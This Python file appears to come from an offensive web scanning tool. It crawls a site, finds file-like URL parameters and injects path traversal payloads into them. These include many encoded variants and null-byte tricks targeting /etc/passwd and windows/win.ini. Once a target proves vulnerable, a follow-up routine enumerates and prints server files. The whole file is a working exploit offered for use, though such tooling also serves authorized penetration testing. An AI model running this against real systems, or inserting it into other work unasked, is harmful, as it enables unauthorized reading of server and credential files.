import re, tldextract, os
from urllib.parse import (urlparse, parse_qs, urljoin, urlencode, urlunparse, urlsplit, urlunsplit, parse_qsl, quote)
from bs4 import BeautifulSoup
from collections import deque
from Dependencies.displays import M, W, R, Y, G, C, handle_error
from Dependencies.get_request import get_request

from Dependencies.Payloads.Traversal.linux.traversals_1_encoded import traversals_1_encoded
from Dependencies.Payloads.Traversal.linux.traversals_2_encoded import traversals_2_encoded
from Dependencies.Payloads.Traversal.linux.traversals_3_encoded import traversals_3_encoded
from Dependencies.Payloads.Traversal.linux.traversals_4_encoded import traversals_4_encoded
from Dependencies.Payloads.Traversal.linux.traversals_base import traversals_base
from Dependencies.Payloads.Traversal.linux.traversals_double_classic import traversals_double_classic
from Dependencies.Payloads.Traversal.linux.traversals_classic import traversals_classic

from Dependencies.Payloads.Traversal.windows.windows_traversals_classic import windows_traversals_classic
from Dependencies.Payloads.Traversal.windows.windows_double_classic import windows_double_classic
from Dependencies.Payloads.Traversal.windows.windows_traversals_1_encoded import windows_traversals_1_encoded
from Dependencies.Payloads.Traversal.windows.windows_traversals_2_encoded import windows_traversals_2_encoded
from Dependencies.Payloads.Traversal.windows.windows_traversals_3_encoded import windows_traversals_3_encoded
from Dependencies.Payloads.Traversal.windows.windows_traversals_4_encoded import windows_traversals_4_encoded
from Dependencies.Payloads.Traversal.windows.windows_traversals_base import windows_traversals_base

from Dependencies.Payloads.Traversal.web_root_path.root_path import path_to_home

NON_EXISTENT_PATH = "../../../../../../nonexistent_1237456.txt"

SKIP_EXTENSIONS = {
    ".jpg", ".jpeg", ".png", ".gif", ".webp",
    ".css", ".svg", ".ico",
    ".woff", ".woff2",
    ".ttf", ".eot",
    ".mp4", ".webm",
    ".pdf", ".zip"
}

INTERESTING_PARAMS = {
    "file", "filename", "path", "image", "img",
    "document", "download", "template", "page", "folder", "manifest"
}

base_linux = [
    "../../../../../../etc/passwd",                                             # traversals_classic
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",                                 # traversals_1_encoded
    "/etc/passwd",                                                              # traversals_base
    "....//....//....//....//....//....//etc/passwd",                           # traversals_double_classic
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",                     # traversals_2_encoded
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",                        # traversals_3_encoded
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"    # traversals_4_encoded
]

base_windows = [
    "..\..\..\..\..\..\windows\win.ini",                                        # windows_traversals_classic
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",                                 # windows_double_classic
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini",                            # windows_traversals_1_encoded
    "%252e%252e%255c%252e%252e%255cwindows/win.ini",                            # windows_traversals_2_encoded
    "..\\..//..\\..//..\\windows\\win.ini",                                     # windows_traversals_3_encoded
    "....\\\\....\\\\....\\\\windows\\win.ini",                                 # windows_traversals_4_encoded
    "C:\\windows\\win.ini"                                                      # windows_traversals_base
]

# ----------------------------
# HELPERS
# ----------------------------
def detect_os_from_headers(args, url):
    response = get_request(args, url)
    server = response.headers.get("Server", "").lower()
    if "win" in server or "microsoft" in server or "iis" in server:
        return "windows"

    if "unix" in server or "linux" in server or "apache" in server or "nginx" in server:
        return "linux"
    return "unknown"

def normalize_netloc(netloc: str) -> str:
    return netloc.lower().replace("www.", "")

def is_valid_http_url(url: str) -> bool:
    try:
        p = urlparse(url)
        return p.scheme in ("http", "https") and bool(p.netloc)
    except:
        return False

def canonicalize_url(url: str) -> str:
    parsed = urlsplit(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    query = urlencode(
        sorted(parse_qsl(parsed.query, keep_blank_values=True)),
        doseq=True
    )
    return urlunsplit((
        parsed.scheme,
        parsed.netloc,
        parsed.path.rstrip("/") or "/",
        query,
        ""
    ))

def extract_params(url):
    return list(parse_qs(urlparse(url).query).keys())

def is_interesting_url(url):
    p = urlparse(url)
    return any(k in p.path.lower() or k in p.query.lower() for k in INTERESTING_PARAMS)

def is_allowed_domain(netloc: str, allowed: set) -> bool:
    netloc = normalize_netloc(netloc)
    return any(netloc == normalize_netloc(d) or netloc.endswith("." + normalize_netloc(d)) for d in allowed)

def is_static_resource(url: str) -> bool:
    p = urlparse(url)
    path = p.path.lower()
    return any(path.endswith(ext) for ext in SKIP_EXTENSIONS) # ignore static files even in query endpoints if it's pure asset

# ----------------------------
# PAYLOADS
# ----------------------------
def extract_param_extension(url: str, param: str):
    qs = parse_qs(urlparse(url).query)
    if param not in qs:
        return None

    value = qs[param][0]
    _, ext = os.path.splitext(value)
    if ext:
        return ext.lstrip(".")
    return None

def build_payloads(os_type):
    if os_type == "windows":
        return base_windows
    if os_type == "linux":
        return base_linux
    return base_linux + base_windows

def extract_endpoint_context(url: str):
    path = urlparse(url).path.strip("/")
    if not path:
        return None
    return path.split("/")[-1]

def build_context_payloads(param_name: str):
    payloads = [
        f"/var/www/{param_name}/../../../../../../etc/passwd",
        f"/{param_name}/../../../../../../etc/passwd",
    ]
    if not param_name.endswith("s"):
        payloads += [
            f"/var/www/{param_name}s/../../../../../../etc/passwd",
            f"/{param_name}s/../../../../../../etc/passwd"
        ]
    return payloads

def build_nullbyte_payloads(extension: str):
    return [
        f"/etc/passwd%00.{extension}",
        f"../../../../../../etc/passwd%00.{extension}",
        f"..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd%00.{extension}"
    ]


def inject_payload(base_url, param, payload):
    parsed = urlsplit(base_url)
    qs = parse_qsl(parsed.query, keep_blank_values=True)
    new_params = []
    replaced = False
    for k, v in qs:
        if k == param:
            new_params.append(f"{k}={payload}")
            replaced = True
        else:
            new_params.append(
                f"{quote(k)}={quote(v)}"
            )

    if not replaced:
        new_params.append(f"{param}={payload}")

    query = "&".join(new_params)
    return urlunsplit((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        query,
        ""
    ))


# ----------------------------
# VULN CHECK
# ----------------------------
def is_vulnerable(response_text, url):
    extract = tldextract.extract(url)
    username = extract.domain
    signatures = [
        "root:x:",
        f"{username}:",
        "/bin/bash",
        "/usr/sbin",
        "daemon:",
        "syslog:",
        "[fonts]",
        "Microsoft Windows",
        "etc/passwd",
        "win.ini"
    ]
    return any(sig in response_text for sig in signatures)

# ----------------------------
# CRAWLER
# ----------------------------
def is_crawlable(url):
    parsed = urlparse(url)
    path = parsed.path.lower()
    if any(path.endswith(ext) for ext in SKIP_EXTENSIONS): # skip only static file navigation
        return False
    return True

def crawl_extract(args, start_url, max_depth=2):
    queue = deque([(start_url, 0)])
    seen = set()
    visited = set()
    results = {}
    allowed_domains = set()

    # INIT DOMAIN
    res = get_request(args, start_url)
    allowed_domains.add(urlparse(start_url).netloc)
    allowed_domains.add(urlparse(res.url).netloc)
    
    if args.verbose:
        print(f"{G}[+] {W}Allowed domains: {allowed_domains}")

    while queue:
        url, depth = queue.popleft()
        if depth > max_depth:
            continue

        url = canonicalize_url(url)
        if url in seen:
            continue

        seen.add(url)
        parsed = urlparse(url)
        is_static = url.lower().endswith(tuple(SKIP_EXTENSIONS))
        has_params = bool(parsed.query)

        # =========================================================
        # STORE ENDPOINTS
        # =========================================================
        params = extract_params(url)
        suspicious = is_interesting_url(url)
        if params or suspicious or has_params:
            base = urlunsplit((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                "",
                ""
            ))

            if base not in results:
                results[base] = {
                    "params": set(),
                    "suspicious": False,
                    "examples": {}
                }

            results[base]["params"].update(params)
            for p in params:
                if p not in results[base]["examples"]:
                    results[base]["examples"][p] = url
            results[base]["suspicious"] |= suspicious

        # =========================================================
        # SKIP STATIC
        # =========================================================
        if is_static and not has_params:
            if args.verbose:
                print(f"{Y}[SKIP STATIC] {W}{url}")
            continue

        if url.lower().endswith(tuple(SKIP_EXTENSIONS)):
            if args.verbose:
                print(f"{Y}[SKIP STATIC PARAMETER] {W}{url}")
            continue

        # =========================================================
        # REQUEST
        # =========================================================
        try:
            res = get_request(args, url)
        except Exception as e:
            handle_error(e, "REQUEST ERROR", args.verbose)
            continue

        if res is None:
            if args.verbose:
                print(f"{R}[NULL RESPONSE] {W}{url}")
            continue

        if args.verbose:
            print(f"{Y}[HTTP] {W}{res.status_code} (DEPTH={depth}) -> {url}")
        
        if res.status_code >= 500:
            continue

        is_html = "text/html" in res.headers.get("Content-Type", "")
        if not is_html:
            continue

        visited.add(url)
        soup = BeautifulSoup(res.text, "html.parser")

        # =========================================================
        # LINK EXTRACTION
        # =========================================================
        for tag, attr in [("a", "href"), ("form", "action"), ("img", "src")]:
            for el in soup.find_all(tag):
                link = el.get(attr)
                if not link:
                    continue

                if link.startswith(("javascript:", "mailto:", "tel:", "#")):
                    continue

                full = canonicalize_url(urljoin(url, link.split("#")[0]))
                parsed_link = urlparse(full)

                if not is_allowed_domain(parsed_link.netloc, allowed_domains):
                    continue
                
                if not is_valid_http_url(full):
                    continue

                link_is_static = full.lower().endswith(tuple(SKIP_EXTENSIONS))
                link_has_params = bool(parsed_link.query)

                if link_is_static and not link_has_params:
                    continue

                if depth + 1 > max_depth:
                    continue

                if full not in seen:
                    queue.append((full, depth + 1))
    print(f"\n{G}[+] Crawl finished")
    print(f"{G}[+] {W}Pages: {len(visited)}")
    print(f"{G}[+] {W}Endpoints: {len(results)}")
    return results

# ----------------------------
# FUCKING DOIT
# ----------------------------
def gimelove(args, base_url, success_payload, extension: str, param_name: str, context):
    payload_map = {
        # =========================================================
        # LINUX
        # =========================================================
        "../../../../../../etc/passwd":
            (traversals_classic, None),
        "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd":
            (traversals_1_encoded, None),
        "/etc/passwd":
            (traversals_base, None),
        "....//....//....//....//....//....//etc/passwd":
            (traversals_double_classic, None),
        "..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd":
            (traversals_2_encoded, None),
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd":
            (traversals_3_encoded, None),
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd":
            (traversals_4_encoded, None),
        f"/var/www/{context}/../../../../../../etc/passwd":
            (traversals_classic, lambda p: f"/var/www/{context}/{p}"),
        f"/{context}/../../../../../../etc/passwd":
            (traversals_classic, lambda p: f"/{context}/{p}"),
        f"/var/www/{context}s/../../../../../../etc/passwd":
            (traversals_classic, lambda p: f"/var/www/{context}s/{p}"),
        f"/{context}s/../../../../../../etc/passwd":
            (traversals_classic, lambda p: f"/{context}s/{p}"),
        f"/etc/passwd%00.{extension}":
            (traversals_base, lambda p: f"{p}%00.{extension}"),
        f"../../../../../../etc/passwd%00.{extension}":
            (traversals_classic, lambda p: f"{p}%00.{extension}"),
        f"..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd%00.{extension}":
            (traversals_classic, lambda p: f"{p}%00.{extension}"),

        # =========================================================
        # WINDOWS
        # =========================================================
        r"..\..\..\..\..\..\windows\win.ini":
            (windows_traversals_classic, None),
        r"..\\..\\..\\..\\..\\..\\windows\\win.ini":
            (windows_double_classic, None),
        r"..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini":
            (windows_traversals_1_encoded, None),
        r"%252e%252e%255c%252e%252e%255cwindows/win.ini":
            (windows_traversals_2_encoded, None),
        r"..\\..//..\\..//..\\windows\\win.ini":
            (windows_traversals_3_encoded, None),
        r"....\\\\....\\\\....\\\\windows\\win.ini":
            (windows_traversals_4_encoded, None),
        r"C:\\windows\\win.ini":
            (windows_traversals_base, None),
    }

    target_payloads, transform = payload_map.get(success_payload, ([], None))
    print(f"{Y}[!] Testing valid format payloads...")
    results_200 = []
    for payload in target_payloads:
        if transform:
            payload = transform(payload)

        url = inject_payload(base_url, param_name, payload)
        try:
            r = get_request(args, url)
            if args.verbose:
                color = R if r.status_code == 200 else Y
                print(f"{color}[{r.status_code}] {W}{url}")

            if r.status_code == 200:
                results_200.append((url, r.text))
        except Exception as e:
            handle_error(e, "ERROR", args.verbose)

    print(f"{Y}\n[!] Testing root path web files...")
    for payload in path_to_home:
        url = inject_payload(base_url, param_name, payload)
        try:
            r = get_request(args, url)
            if args.verbose:
                color = R if r.status_code == 200 else Y
                print(f"{color}[{r.status_code}] {W}{url}")

            if r.status_code == 200:
                results_200.append((url, r.text))
        except Exception as e:
            handle_error(e, "ERROR", args.verbose)

    print(f"\n{C}[+] Responses with HTTP 200:\n")
    for url, content in results_200:
        print(f"{R}[+] {W}{url}")
        print(f"{Y}-" * 80)
        print(f"{G}{content}\n")


# ----------------------------
# TESTING
# ----------------------------
def test_traversal(args, base_url, param, os_type):
    payloads = build_payloads(os_type)
    if not os_type == "windows":
        context = extract_endpoint_context(base_url)
        payloads += build_context_payloads(context)
        ext = extract_param_extension(base_url, param)
        if ext:
            payloads += build_nullbyte_payloads(ext)


    parsed = urlsplit(base_url)
    clean_base = urlunsplit((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        "",
        ""
    ))

    tested = set()
    for payload in payloads:
        url = inject_payload(clean_base, param, payload)
        norm = canonicalize_url(url)
        if norm in tested:
            continue

        tested.add(norm)
        if args.verbose:
            print(f"{G}- {W}{url}")
        
        r = get_request(args, url)
        if is_vulnerable(r.text, clean_base):
            print(f"{R}[VULNERABLE] {W}{url}")
            user_input = input(f"\n{Y}[?] Enum existing files? (y/n): {C}").strip().lower()
            if user_input in ("y", "yes"):
                gimelove(args, clean_base, payload, ext, param, context)
                break
            else:
                handle_error("Invalid user input", "ERROR", args.verbose)
                break
